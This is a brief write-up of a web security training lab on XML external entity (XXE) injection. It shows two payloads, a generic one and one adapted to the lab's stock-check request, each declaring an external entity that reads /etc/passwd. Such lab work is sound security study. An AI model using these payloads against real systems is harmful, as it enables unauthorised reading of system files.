Title: Exploiting XXE using external entities to retrieve files
Desc:  This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 



Example of XXE attack:
`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>`

All I need to do is to change request for stock number to have external entity.

`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`
